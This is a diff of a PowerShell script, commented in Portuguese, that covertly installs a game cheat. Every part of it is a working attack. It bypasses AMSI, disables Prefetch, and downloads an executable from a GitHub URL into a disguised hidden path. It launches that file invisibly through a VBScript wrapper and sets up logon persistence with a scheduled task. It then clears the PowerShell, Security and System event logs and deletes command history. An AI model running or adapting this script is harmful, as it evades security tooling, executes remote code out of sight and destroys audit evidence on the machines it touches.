@@ -1,23 +1,36 @@
 # 1. Bypass AMSI
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
+# 2. Desativa Prefetch
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
 
-# 2. Baixa o cheat
+# 3. Baixa e esconde o cheat
 $url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
 $path = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
 (New-Object System.Net.WebClient).DownloadFile($url, $path)
 Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
 
-# 3. Roda escondido via wscript
-$vbsPath = "$env:TEMP\sys_update.vbs"
+# 4. Cria atalho invisível via VBScript para não abrir janela
+$vbsPath = "$env:TEMP\sync.vbs"
 "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"`"`"$path`"`"`", 0, False" | Out-File -FilePath $vbsPath -Encoding ASCII
 Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
 
-# 4. Persistência no Registro
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regPath -Name "WinSyncClient" -Value "wscript.exe `"$vbsPath`""
+# 5. Persistência (Tarefa Agendada para rodar no login)
+$taskName = "WindowsSyncSystem"
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue
 
-# 5. Limpeza
+# 6. Restaura Prefetch
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
+
+# 7. LIMPEZA PROFUNDA DE LOGS (O pulo do gato)
+Start-Sleep -Seconds 1
+# Limpa o Event Viewer de Scripts e do PowerShell
+wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+wevtutil.exe cl "Windows PowerShell" 2>$null
+wevtutil.exe cl "Security" 2>$null
+wevtutil.exe cl "System" 2>$null
+
+# Limpa o histórico
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
